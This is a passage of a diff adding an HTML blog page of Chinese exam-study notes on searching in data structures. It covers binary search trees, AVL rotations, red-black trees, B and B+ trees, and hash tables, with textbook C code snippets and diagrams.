+</span></span><span class="line"><span class="cl">        <span class="n">T</span><span class="o">-&gt;</span><span class="n">key</span><span class="o">=</span><span class="n">k</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">T</span><span class="o">-&gt;</span><span class="n">lchild</span><span class="o">=</span><span class="n">T</span><span class="o">-&gt;</span><span class="n">rchild</span><span class="o">=</span><span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>                    <span class="c1">//返回1，插入成功
+</span></span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">k</span><span class="o">==</span><span class="n">T</span><span class="o">-&gt;</span><span class="n">key</span><span class="p">)</span>                <span class="c1">//树中存在相同关键字的结点，插入失败
+</span></span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">k</span><span class="o">&lt;</span><span class="n">T</span><span class="o">-&gt;</span><span class="n">key</span><span class="p">)</span>                 <span class="c1">//插入到T的左子树
+</span></span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nf">BST_Insert</span><span class="p">(</span><span class="n">T</span><span class="o">-&gt;</span><span class="n">lchild</span><span class="p">,</span><span class="n">k</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span>                             <span class="c1">//插入到T的右子树
+</span></span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nf">BST_Insert</span><span class="p">(</span><span class="n">T</span><span class="o">-&gt;</span><span class="n">rchild</span><span class="p">,</span><span class="n">k</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h4 id="7314-二叉排序树的构造">7.3.1.4 二叉排序树的构造</h4>
+<p>构造就是不断往二叉树中插入结点的过程，实现代码如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">Creat_BST</span><span class="p">(</span><span class="n">BiTree</span> <span class="o">&amp;</span><span class="n">T</span><span class="p">,</span> <span class="n">KeyType</span> <span class="n">str</span><span class="p">[],</span> <span class="kt">int</span> <span class="n">n</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">T</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>    <span class="c1">//初始时 T 为空树
+</span></span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="n">i</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">)</span> <span class="p">{</span>  <span class="c1">//依次将每个关键字插入二叉排序树
+</span></span></span><span class="line"><span class="cl">        <span class="nf">BST_Insert</span><span class="p">(</span><span class="n">T</span><span class="p">,</span> <span class="n">str</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">i</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h4 id="7315-二叉排序树的删除">7.3.1.5 二叉排序树的删除</h4>
+<p>二叉排序树的删除分为以下三种情况：</p>
+<ol>
+<li>被删除结点是叶结点，<strong>直接删除即可</strong>。</li>
+<li>被删除结点仅有一棵非空子树（左子树和右子树），则将其唯一的子树<strong>上移</strong>作为被删除结点的双亲结点的新子树。</li>
+<li>若被删除结点 z 同时具有两棵子树，则可使用 z 的<strong>直接后继或直接前驱（是中序遍历的上一个和下一个结点！）<strong>来代替 z 。替换完成之后还要删除直接前驱或者直接后继结点，由于直接前驱或者直接后继</strong>至多</strong>只会有一个子树，这样就转换成了第一或者第二种情况，</li>
+</ol>
+<p><img src="http://tuchuang.mrlxl.cn/picture/20260226154608304.png" alt="二叉树的删除"></p>
+<h4 id="7316-二叉排序树的查找效率">7.3.1.6 二叉排序树的查找效率</h4>
+<p>不论查找成功还是失败其 ASL 很大程度上取决于二叉排序树的高度，下面是关于 <strong>ASL<sub>成功</sub></strong> 和 <strong>ASL<sub>失败</sub></strong> 的两张示意图：
+<img src="http://tuchuang.mrlxl.cn/picture/20260226155732257.png" alt="ASL成功">
+<img src="http://tuchuang.mrlxl.cn/picture/20260226155611581.png" alt="ASL失败"></p>
+<h3 id="732-平衡二叉树">7.3.2 平衡二叉树</h3>
+<h4 id="7321-平衡二叉树的概念">7.3.2.1 平衡二叉树的概念</h4>
+<p><strong>平衡二叉树</strong>（Balanced Binary Tree），简称<strong>平衡树</strong>（<strong>AVL 树</strong>，发明人名字缩写）—— 树上任一结点的左子树和右子树的高度之差不超过 1。平衡二叉树是为了避免二叉排序树的高度增长过快而导致性能下降而定义的一种树，所以<strong>平衡二叉树一定是二叉排序树</strong></p>
+<p><strong>平衡因子</strong>的概念：<strong>平衡因子</strong> = <strong>左子树高度 - 右子树高度</strong>。平衡二叉树中所有结点的平衡因子只能是 -1，0，1。</p>
+<p><strong>最小不平衡子树</strong>：在插入操作中，每次插入都会对各结点的平衡因子造成影响，当开始存在失衡结点时。<strong>距离新结点最近</strong>且以<strong>平衡因子绝对值</strong>大于 1 的结点为根结点的子树称为<strong>最小不平衡子树</strong>，如图所示：
+<img src="http://tuchuang.mrlxl.cn/picture/20260226162125234.png" alt="最小不平衡子树"></p>
+<h4 id="7322-平衡二叉树的插入">7.3.2.2 平衡二叉树的插入</h4>
+<p>对平衡二叉树进行插入操作可能会出现失衡现象和破坏二叉排序树的特性，那我们如何让他变得平衡呢且不破坏特性呢？其实我们只需要对最小不平衡子树进行操作，<strong>将最小不平衡子树变的平衡，那么整棵树都会变得平衡</strong>。我们把导致失衡的情况分为以下四种，对不同的情况有不同的处理方式：</p>
+<ul>
+<li><strong>LL</strong> —— 在A的左孩子的左子树中插入导致不平衡</li>
+<li><strong>RR</strong> —— 在A的右孩子的右子树中插入导致不平衡</li>
+<li><strong>LR</strong> —— 在A的左孩子的右子树中插入导致不平衡</li>
+<li><strong>RL</strong> —— 在A的右孩子的左子树中插入导致不平衡</li>
+</ul>
+<p>这四种情况的处理方式不仅能够保持平衡，也能保持二叉排序树的特性。
+下方四种情况介绍图中，我们将结点 A 作为固定的最小不平衡子树的根结点，将所有子树的高度都设置为 h （这是为了保证 A 在插入操作后必定作为根结点）。当然<strong>实际情况</strong>需具体确定<strong>根结点位置</strong>。</p>
+<p><strong>LL平衡旋转（右单旋转）</strong>:
+<img src="http://tuchuang.mrlxl.cn/picture/20260226193043250.png" alt="LL平衡旋转">
+其代码的指针移动顺序是这样的：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">f</span><span class="o">-&gt;</span><span class="n">lchild</span><span class="o">=</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">rchild</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">-&gt;</span><span class="n">rchild</span><span class="o">=</span><span class="n">f</span>
+</span></span><span class="line"><span class="cl"><span class="n">gf</span><span class="o">-&gt;</span><span class="n">lchild</span><span class="o">/</span><span class="n">rchild</span><span class="o">=</span><span class="n">p</span>
+</span></span></code></pre></div><p><strong>RR平衡旋转（左单旋转）</strong>：
+<img src="http://tuchuang.mrlxl.cn/picture/20260226192817875.png" alt="RR平衡旋转">
+其代码的指针移动顺序是这样的：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">f</span><span class="o">-&gt;</span><span class="n">rchild</span><span class="o">=</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">lchild</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">-&gt;</span><span class="n">lchild</span><span class="o">=</span><span class="n">f</span>
+</span></span><span class="line"><span class="cl"><span class="n">gf</span><span class="o">-&gt;</span><span class="n">lchild</span><span class="o">/</span><span class="n">rchild</span><span class="o">=</span><span class="n">p</span>
+</span></span></code></pre></div><p><strong>LR平衡旋转（先左后右双旋转）</strong>：
+<img src="http://tuchuang.mrlxl.cn/picture/20260226195501098.png" alt="LR平衡旋转">
+<strong>RL平衡旋转（先右后左双旋转）</strong>：
+<img src="http://tuchuang.mrlxl.cn/picture/20260226195009187.png" alt="RL平衡旋转"></p>
+<h4 id="7323-平衡二叉树的查找效率分析">7.3.2.3 平衡二叉树的查找效率分析</h4>
+<p>具有 n 个结点的平衡二叉树的<strong>平均查找长度</strong>为<strong>log<sub>2</sub>n</strong>，推导过程如下：
+<img src="http://tuchuang.mrlxl.cn/picture/20260226200514877.png" alt="平衡二叉树的查找效率">
+具有 n 个结点的平衡二叉树的<strong>最大高度</strong>也为<strong>log<sub>2</sub>n</strong>，这个证明很复杂，记住就好。</p>
+<h4 id="7323-平衡二叉树的删除">7.3.2.3 平衡二叉树的删除</h4>
+<p>平衡二叉树的删除思想和插入目标是一样的，都是需要：</p>
+<ol>
+<li><strong>保持二叉树的平衡</strong></li>
+<li><strong>保持二叉排序树的特性</strong></li>
+</ol>
+<p>插入操作在上面 7.3.1 小节已经说过三种情况了。这里将介绍如何在删除操作之后保持平衡和特性。步骤如下：</p>
+<ol>
+<li>删除结点。</li>
+<li>一路向北找到最小不平衡子树，找不到就完结撒花。</li>
+<li>找最小不平衡子树下，“个头” 最高（以其为根结点的树高度最高）的儿子、孙子。</li>
+<li>根据孙子的位置，调整平衡（LL/RR/LR/RL）。</li>
+<li>如果不平衡向上传导，继续步骤 2 （从被调整子树的根出发，一路向北&hellip;）</li>
+</ol>
+<p>光看文字有点懵，这里我举一个完整的例子：
+<img src="http://tuchuang.mrlxl.cn/picture/DF7D88B25F2020C10C992DB4009AECE7.jpg" alt="平衡二叉树的删除示例"></p>
+<h3 id="733-红黑树">7.3.3 红黑树</h3>
+<h4 id="7331-为什么要引入红黑树">7.3.3.1 为什么要引入红黑树</h4>
+<p><strong>平衡二叉树 AVL：</strong> 1962 年提出，插入 / 删除很容易破坏 “平衡” 特性，需要频繁调整树的形态。如：插入操作导致不平衡，则需要先计算平衡因子，找到最小不平衡子树（时间开销大），再进行 LL/RR/LR/RL 调整。
+<strong>红黑树 RBT：</strong> 1972 年被提出，插入 / 删除很多时候不会破坏 “红黑” 特性，无需频繁调整树的形态。即便需要调整，一般都可以在常数级时间内完成。</p>
+<p>因此，<strong>AVL 树</strong>适用于以查为主，很少增 / 删的场景。<strong>红黑树 RBT</strong> 适用于频繁增 / 删的场景，实用性更强。也条件更加宽松（左右子树最大高度差不同）。</p>
+<h4 id="7332-红黑树的概念">7.3.3.2 红黑树的概念</h4>
+<p><strong>红黑树</strong>肯定是一个<strong>二叉排序树</strong>，相较于 BST， 红黑树有这些要求（<strong>左根右，根叶黑，不红红，黑路同</strong>）：</p>
+<ol>
+<li>每个结点或是红色，或是黑色的</li>
+<li>根节点是黑色的</li>
+<li>叶结点（或叫做：外部结点、NULL 结点、失败结点）均是黑色的</li>
+<li>不存在两个相邻的红结点（即红结点的父节点和孩子结点均是黑色的）</li>
+<li>对每个结点，从该节点到任一叶结点的简单路径上，所含黑结点的数目相同</li>
+</ol>
+<p>红黑树的示意图和每个结点的实现代码如下：
+<img src="http://tuchuang.mrlxl.cn/picture/20260227211236497.png" alt="红黑树"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">RBnode</span> <span class="p">{</span>    <span class="c1">// 红黑树的结点定义
+</span></span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">key</span><span class="p">;</span>       <span class="c1">// 关键字的值
+</span></span></span><span class="line"><span class="cl">    <span class="n">RBnode</span><span class="o">*</span> <span class="n">parent</span><span class="p">;</span> <span class="c1">// 父节点指针
+</span></span></span><span class="line"><span class="cl">    <span class="n">RBnode</span><span class="o">*</span> <span class="n">lchild</span><span class="p">;</span> <span class="c1">// 左孩子指针
+</span></span></span><span class="line"><span class="cl">    <span class="n">RBnode</span><span class="o">*</span> <span class="n">rchild</span><span class="p">;</span> <span class="c1">// 右孩子指针
+</span></span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">color</span><span class="p">;</span>      <span class="c1">// 结点颜色，如：可用 0/1 表示黑/红，也可使用枚举型enum表示颜色
+</span></span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span></code></pre></div><h4 id="7333-红黑树的查找">7.3.3.3 红黑树的查找</h4>
+<p>红黑树的查找很简单，和 AVL，BST 是一样的。因为内部有 n 个结点的红黑树高度 h &lt;= 2 log<sub>2</sub> (n + 1)，自然其查找的时间复杂度也是 <strong>O(log<sub>2</sub>n)</strong> ，示意图如下：
+<img src="http://tuchuang.mrlxl.cn/picture/20260227172431393.png" alt="红黑树的查找"></p>
+<h4 id="7334-红黑树的插入">7.3.3.4 红黑树的插入</h4>
+<p>为了维持红黑树的特性，红黑树中结点进行插入的规则如下：</p>
+<ul>
+<li>先查找，确定插入位置（原理同二叉排序树），插入新结点
+<ul>
+<li>新结点是<strong>根</strong> —— 染为<strong>黑色</strong></li>
+<li>新结点<strong>非根</strong> —— 染为<strong>红色</strong>（防止破坏“黑路同”）
+<ul>
+<li>若插入新结点后依然满足红黑树定义（一般就判断一下“不红红”），则插入结束</li>
+<li>若插入新结点后不满足红黑树定义，需要调整，使其重新满足红黑树定义，如何调整：看<strong>新结点叔叔的脸色</strong>
+<ul>
+<li><strong>黑叔： 旋转 + 染色</strong>
+<ul>
+<li>LL 型：右单旋，父换爷 + 父爷染色</li>
+<li>RR 型：左单旋，父换爷 + 父爷染色</li>
+<li>LR 型：左、右双旋，儿换爷 + 儿爷染色</li>
+<li>RL 型：右、左双旋，儿换爷 + 儿爷染色</li>
+</ul>
+</li>
+<li><strong>红叔： 染色 + 变新</strong>
+<ul>
+<li>叔父爷染色，爷变为新结点（再回到上面新结点的判断）</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>如果从一棵空的红黑树依次插入如下结点，基本就能覆盖所有情况：20,10,5,30,40,57,3,2,4,35,25,18,22,23,24,19,18。这里举例过程中几个易错过程。
+<img src="http://tuchuang.mrlxl.cn/picture/20260227205044773.png" alt="黑叔LL">
+<img src="http://tuchuang.mrlxl.cn/picture/20260227205312010.png" alt="红叔">
+<img src="http://tuchuang.mrlxl.cn/picture/20260227210142598.png" alt="黑叔LR">
+<img src="http://tuchuang.mrlxl.cn/picture/20260227210739442.png" alt="重合，最终结果"></p>
+<h4 id="7335-红黑树的删除">7.3.3.5 红黑树的删除</h4>
+<p>红黑树的删除比插入还要难，作者不管了嘿嘿。
+<strong>重要考点：</strong></p>
+<ol>
+<li>红黑树删除操作的时间复杂度 = $O(\log_2 n)$</li>
+<li>在红黑树中删除结点的处理方式和“二叉排序树的删除”一样</li>
+<li>按步骤二删除结点后，可能破坏“红黑树特性”，此时需要调整结点颜色、位置，使其再次满足“红黑树特性”。</li>
+</ol>
+<h2 id="74--b-树-和-b-树">7.4  B 树 和 B+ 树</h2>
+<h3 id="741-b-树">7.4.1 B 树</h3>
+<h4 id="7411-b-树的概念">7.4.1.1 B 树的概念</h4>
+<p>m 阶 B 树是一种自平衡的 m 路查找树，其所有叶结点都位于同一层次。示意图如下：
+<img src="http://tuchuang.mrlxl.cn/picture/20260228153028086.png" alt="B 树的概念">
+那么为什么 B 树要规定这么多特性？这些特性的规定有什么原因？</p>
+<ul>
+<li>
+<p><strong>性质 1 ：</strong> m 阶树中么个结点至多有 m 棵子树，即至多含有 m-1 个关键字。
+m 阶就是最多能是 m 叉树，m-1 能划分出 m 个区间。这里以 5 叉树举例示意如下：
+<img src="http://tuchuang.mrlxl.cn/picture/20260228155330621.png" alt="性质1"></p>
+</li>
+<li>
+<p><strong>性质 2 ：</strong> 若根结点不是终端结点则至少有两棵子树。
+这个简单，由于 B 树是要求绝对平衡的树，那若根结点只有一棵子树怎么保持平衡呢。<strong>性质 5</strong> 也同理。</p>
+</li>
+<li>
+<p><strong>性质 3 ：</strong> 除根结点外所有非叶结点至少有 (向上取整)[m/2] 棵子树，即至少含有 (向上取整)[m/2] - 1 个关键字。
+这其实就是种策略，为了保证查找效率，那<strong>为什么要把根结点除外</strong>呢，其实是做不到，因为若整棵树只有一个元素，那么根结点必然只有两个分支，不就没法满足了吗。示意图如下：
+<img src="http://tuchuang.mrlxl.cn/picture/20260228160834574.png" alt="性质3">
+<img src="http://tuchuang.mrlxl.cn/picture/20260228161008231.png" alt="性质3"></p>
+</li>
+</ul>
+<p>我们将 B 树的<strong>核心特质</strong>提取如下：</p>
+<ol>
+<li>根节点的子树数$\in[2, m]$，关键字数$\in[1, m-1]$。
+其他结点的子树数$\in[\lceil m/2 \rceil, m]$；关键字数$\in[\lceil m/2 \rceil-1, m-1]$</li>
+<li>对任一结点，其所有子树高度都相同</li>
+<li>关键字的值：子树0&lt;关键字1&lt;子树1&lt;关键字2&lt;子树2&lt;&hellip;（类比二叉查找树 左&lt;中&lt;右）</li>
+<li><strong>B 树的高度（磁盘存取次数）：</strong> 证明看书，含 (n) 个关键字的 (m) 叉B树，其高度 (h) 满足：
+<strong>[
+\log_m(n+1) \le h \le \log_{\lceil m/2 \rceil}\frac{n+1}{2} + 1
+]</strong></li>
+</ol>
+<h4 id="7412-b-树的查找">7.4.1.2 B 树的查找</h4>
+<p>B 树的查找和二叉排序树的查找很类似，只是每个节点都是有很多个关键字的<strong>有序表</strong>。
+B 树的查找包含<strong>两个基本操作</strong>：</p>
+<ol>
+<li><strong>在 B 树中向下导航（磁盘 I/O 级别）：</strong> 根据关键字区间，决定下一次读哪个块。</li>
+<li><strong>在结点内查找关键字（内存）：</strong> 在一个有序数组里做顺序/折半查找。</li>
+</ol>
+<p>每次磁盘 I/O 读取一个结点，在内存中通过关键字区间比较，唯一确定下一子树指针，并继续向下，直到命中或到达叶子结点（失败）。</p>
+<h4 id="7413-b-树的插入">7.4.1.3 B 树的插入</h4>
+<p>将关键字 key 插入 B树的过程如下：</p>
+<ol>
+<li><strong>定位：</strong> 利用查找算法，沿着路径向下查找，最终指向一个外部叶结点（表示查找失败），找到其父结点（终端结点）。<strong>最终插入位置一定是终端结点！！</strong></li>
+<li><strong>插入与分裂：</strong> 每个非跟结点的个数必须维持在区间$[\lceil m/2 \rceil-1, m-1]$，若插入之后的关键字个数不超过 m - 1 可直接插入；若插入后关键字个数超过 m - 1，则必须进行分裂。</li>
+</ol>
+<p><strong>分裂方法：</strong> 创建一个新结点，并将插入 key 后的原结点中的关键字从中间位置（第 ⌈m/2⌉ （向上取整）个关键字）处分成左右两部分：左半部分的关键字保留在原结点中；右半部分的关键字移至新结点中；中间的关键字（注意，是关键字而非结点）被提升并插入原结点的父结点。若父结点因接收该关键字而超出上限（关键字数大于 m−1），则对父结点递归执行分裂操作。这一过程可能向上传播，直至根结点。若根结点也被分裂，则 B 树高度增 1。</p>
+<p>以一个例子作为说明：
+依次向空 B 树中插入 25,38,49,60,80,90,99,88,83,87,70。
+<img src="http://tuchuang.mrlxl.cn/picture/20260228180613926.png" alt="B树的插入"></p>
+<h4 id="7414-b-树的删除">7.4.1.4 B 树的删除</h4>
+<p>B 树的删除比插入操作更复杂，因为删除之后需保证每个结点的关键字字数不少于下限（向上取整）⌈m/2⌉ - 1 ，可能需要通过 “借位” 或 “合并” 来恢复平衡。</p>
+<ul>
+<li>
+<p><strong>当删除之后，结点关键字没有低于下限：</strong></p>
+<ul>
+<li><strong>终端结点：</strong> 直接删除。</li>
+<li><strong>非终端结点：</strong> 将被删除元素 k 用直接前驱或者直接后继 k1 替换，将 k1 结点删除，从而转换成终端结点的删除。</li>
+</ul>
+</li>
+<li>
+<p><strong>当删除之后，结点的关键字低于下限：</strong></p>
+<ul>
+<li>
+<p><strong>兄弟够借：</strong>
+兄弟够借。若被删除关键字所在结点删除前的关键字个数低于下限，且与此结点右（或左）兄弟结点的关键字个数还很宽裕，则需要调整该结点、右（或左）兄弟结点及其双亲结点（父子换位法）。这里以 5 阶 B 树为例说明：
+<img src="http://tuchuang.mrlxl.cn/picture/20260228190604346.png" alt="兄弟够借"></p>
+</li>
+<li>
+<p><strong>兄弟不够借：</strong>
+兄弟不够借。若被删除关键字所在结点删除前的关键字个数低于下限，且此时与该结点相邻的左、右兄弟结点的关键字个数均为 ⌈m/2⌉−1，则将关键字删除后与左（或右）兄弟结点及双亲结点中的关键字进行合并。<br></p>
+<p><strong>在合并过程中</strong>，双亲结点中的关键字个数会减 1。若其双亲结点是根结点且关键字个数减少至 0（根结点关键字个数为 1 时，有 2 棵子树），则直接将根结点删除，合并后的新结点成为根；若双亲结点不是根结点，且关键字个数减少到 ⌈m/2⌉−2，则又要与它自己的兄弟结点进行调整或合并操作，并重复上述步骤，直至符合 B 树的要求为止。
+<img src="http://tuchuang.mrlxl.cn/picture/20260228191818401.png" alt="兄弟不够借"></p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="742-b-树">7.4.2 B<sup>+</sup> 树</h3>
+<p>考研中 B<sup>+</sup> 树一般只考概念，示意图如下：
+<img src="http://tuchuang.mrlxl.cn/picture/20260228201006054.png" alt="B+树">
+和 B 树的不同点如下，考研题目一般对比考，仔细阅读：
+<img src="http://tuchuang.mrlxl.cn/picture/20260228200615105.png" alt="B树与B+不同点"></p>
+<h2 id="75-散列hash表">7.5 散列（Hash）表</h2>
+<p>逻辑结构是集合，存储结构是散列存储，底层依托是数组。</p>
+<h3 id="751-散列表的基本概念">7.5.1 散列表的基本概念</h3>
+<ul>
+<li><strong>散列表：</strong> 又称哈希表，可以根据数据元素的关键字计算出它在散列表中的存储地址。</li>
+<li><strong>散列函数：</strong> 建立了 “关键字”→“存储地址” 的映射关系。散列函数构建的越好，发生冲突的概率越小。</li>
+<li><strong>同义词：</strong> 若不同的关键字通过散列函数映射到同一个存储地址，则称它们为 “同义词”。</li>
+<li><strong>冲突（碰撞）：</strong> 在散列表中插入一个数据元素时，若插入的位置已经存储了其他元素，则称这种情况为 “冲突（碰撞）”。</li>
+</ul>
+<p>示意图如下：
+<img src="http://tuchuang.mrlxl.cn/picture/20260228203622254.png" alt="散列表的基本概念"></p>
+<h3 id="752-散列函数的构造方法">7.5.2 散列函数的构造方法</h3>
+<p>在构造散列函数时，必须注意以下三点：</p>
+<ol>
+<li><strong>定义域</strong>必须涵盖所有可能出现的关键字，<strong>值域</strong>不能超出散列表的地址范围。</li>
+<li>尽可能减少冲突。散列函数计算出来的地址应尽可能<strong>均匀分布</strong>在整个地址空间。</li>
+<li>散列函数应<strong>尽量简单</strong>，能够快速计算出任意一个关键字对应的散列地址。</li>
+</ol>
+<p>对于构造散列函数，我们有如下四个方法：</p>
+<ul>
+<li>
+<p><strong>除留余数法（考研，现实都用的最多）：</strong> 一定注意要质数。
+适用场景：比较通用，只要关键字是整数就行。<br>
+<img src="http://tuchuang.mrlxl.cn/picture/20260301163101794.png" alt="除留余数法"></p>
+</li>
+<li>
+<p><strong>直接定址法：</strong> 严格来说不属于散列函数，但是考研把他放一起了。
+适用场景：关键字分布基本连续。
+<img src="http://tuchuang.mrlxl.cn/picture/20260301163514818.png" alt="直接定址法"></p>
+</li>
+<li>
+<p><strong>数字分析法：</strong>
+适用场景：关键字集合已知，且关键字的某几个数码位分布均匀。
+<img src="http://tuchuang.mrlxl.cn/picture/20260301164017945.png" alt="数字分析法"></p>
+</li>
+<li>
+<p><strong>平方取中法：</strong>
+适用场景：关键字每位都不够均匀。
+<img src="http://tuchuang.mrlxl.cn/picture/20260301164357200.png" alt="平方取中法"></p>
+</li>
+</ul>
+<h3 id="753-处理冲突的方法">7.5.3 处理冲突的方法</h3>
+<p><strong>任何散列函数都无法绝对避免冲突</strong>，因此，必须设计有效的冲突处理机制。</p>
+<h4 id="7531-拉链法链接法chaining">7.5.3.1 拉链法（链接法，chaining）</h4>
+<p>将散列到同一地址的所有<strong>同义词</strong>组织成一个链表，因此查找、插入和删除操作都主要在响应的同义词链表中进行。
+<strong>插入</strong>使用头插法（默认）或尾插法都行，示意图如下：
+<img src="http://tuchuang.mrlxl.cn/picture/20260301171102145.png" alt="拉链法插入">
+<strong>查找</strong>也是在各个链表中查找，先计算哈希值，再进行关键字比对。示例如下：
+<img src="http://tuchuang.mrlxl.cn/picture/20260301172709959.png" alt="拉链法查找">
+<strong>删除</strong>没啥好说的，查到了删除就行，没查到就没法删。</p>
+<h4 id="7532-开放定址法">7.5.3.2 开放定址法</h4>
+<p>简单来说，就是发生冲突，就给新元素找另外一个空闲位置。那么如何找到空闲位置，这里给出一个递推公式：
+$$
+H_i = (H(\text{key}) + d_i)\ %\ m
+$$
+H(key) 为散列函数，H<sub>i</sub> 为发生第 i 次冲突时的散列地址，m 为散列表表长，d<sub>i</sub> 为第 i 次探测的增量（偏移量）。那么只需要确定<strong>增量序列</strong>，对应的冲突处理办法就被确定了，常见的<strong>增量序列取法</strong>有以下四种：</p>
+<p><strong>线性探测法：</strong>
+<img src="http://tuchuang.mrlxl.cn/picture/20260301180448746.png" alt="线性探测法">
+<strong>平方探测法：</strong>
+<img src="http://tuchuang.mrlxl.cn/picture/20260301181644006.png" alt="平方探测法">
+<strong>双散列法：</strong>
+<img src="http://tuchuang.mrlxl.cn/picture/20260301182126974.png" alt="双散列法">
+<strong>伪随机序列法：</strong>
+<img src="http://tuchuang.mrlxl.cn/picture/20260301182403686.png" alt="伪随机序列法"></p>
+<p>那使用开放定址法如何进行<strong>元素的查找和删除</strong>？首先题目肯定会给你 key 值，也肯定会告诉你使用的是哪种增量序列。那进行查找和删除的方法自然就不言而喻。</p>
+<p>但是使用这种按不同增量序列顺序挨个遍历过去的方法会有一个坑！！如下图所示：
+<img src="http://tuchuang.mrlxl.cn/picture/20260301190242301.png" alt="删除有坑">
+因为我们将上图 3 这个位置的元素删除的时候使用的是直接将其<strong>物理删除</strong>，那我们可以将其换成<strong>逻辑删除</strong>，用一个标识位 flag 表示这个元素是删除了还是没有。</p>
+<p>对于散列表中有太多逻辑删除的位置，会导致 “看起来很满，其实很空” 查找效率降低，那我们可以定期对这些位置进行清理。如下图所示：
+<img src="http://tuchuang.mrlxl.cn/picture/20260301190839261.png" alt="定期清理"></p>
+<h3 id="754-散列查找的性能分析">7.5.4 散列查找的性能分析</h3>
+<h4 id="7541-asl-计算线性探测法">7.5.4.1 ASL 计算（线性探测法）</h4>
+<p>所谓查找的性能分析，自然就是计算其 ASL ，这里用考研中出现最多的开放定址法中的线性探测法举例。示意图如下：
+注意计算 ASL <sub>成功</sub> 和 ASL <sub>失败</sub> 时的其分母含义是不同的！！！
+<img src="http://tuchuang.mrlxl.cn/picture/20260301202356652.png" alt="线性探测法性能分析">
+当删除了一个元素之后再计算，这种情况易错，要注意哦，示意图如下：
+<img src="http://tuchuang.mrlxl.cn/picture/20260301202717100.png" alt="删除后易错情况"></p>
+<h4 id="7542-影响查找效率的因素">7.5.4.2 影响查找效率的因素</h4>
+<p>散列表的查找效率主要取决于三个因素：<strong>散列函数、冲突处理方法、装填因子</strong>。
+装填因子：
+$$
+\alpha = \frac{表中记录数 n}{散列表长度 m}
+$$
+显然，$\alpha$ 越大，发生冲突的可能性越高，反之越小。</p>
+<h4 id="7543-聚集现象">7.5.4.3 聚集现象</h4>
+<p>聚集现象是在处理冲突的过程中，几个<strong>初始散列地址不同</strong>的元素争夺<strong>同一个后继地址</strong>的现象。使用线性探测法时，这种现象高发。
+<img src="http://tuchuang.mrlxl.cn/picture/20260301204247435.png" alt="聚集现象">
+那么怎么解决这个问题呢，不用线性探测法，用其他的增量序列不就行了吗。如下图所示：
+<img src="http://tuchuang.mrlxl.cn/picture/20260301204619211.png" alt="解决聚集现象"></p>
+<h1 id="附言">附言</h1>
+<p>查找好难 :(</p>
+
+    </article>
+    <p style="text-align: center; margin-top: 50px; opacity: 0.6; font-size: 0.9em;">总是在探索未知</p>
+
+  </div>
+  <div class="sidebar-right">
+    <h3>大纲</h3>
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#数据结构之查找">数据结构之查找</a></li>
+    <li><a href="#第七章_查找">第七章_查找</a>
+      <ul>
+        <li><a href="#71-查找的基本概念">7.1 查找的基本概念</a></li>
+        <li><a href="#72-线性表查找">7.2 线性表查找</a>
+          <ul>
+            <li><a href="#721-顺序查找">7.2.1 顺序查找</a>
+              <ul>
+                <li><a href="#7211-一般顺序查找">7.2.1.1 一般顺序查找</a></li>
+                <li><a href="#7212-哨兵模式顺序查找">7.2.1.2 哨兵模式顺序查找</a></li>
+                <li><a href="#7213-有序线性表顺序查找">7.2.1.3 有序线性表顺序查找</a></li>
+                <li><a href="#7214-查找概率不相等的顺序查找">7.2.1.4 查找概率不相等的顺序查找</a></li>
+              </ul>
+            </li>
+            <li><a href="#722-折半查找">7.2.2 折半查找</a>
+              <ul>
+                <li><a href="#7221-折半查找实现">7.2.2.1 折半查找实现</a></li>
+                <li><a href="#7222-折半查找性质">7.2.2.2 折半查找性质</a></li>
+                <li><a href="#7223-折半查找判定树">7.2.2.3 折半查找判定树</a></li>
+              </ul>
+            </li>
+            <li><a href="#723-分块查找">7.2.3 分块查找</a>
+              <ul>
+                <li><a href="#7231-分块查找的概念">7.2.3.1 分块查找的概念</a></li>
+                <li><a href="#7232-分块查找的使用">7.2.3.2 分块查找的使用</a></li>
+                <li><a href="#7234-分块查找求-asl">7.2.3.4 分块查找求 ASL</a></li>
+              </ul>
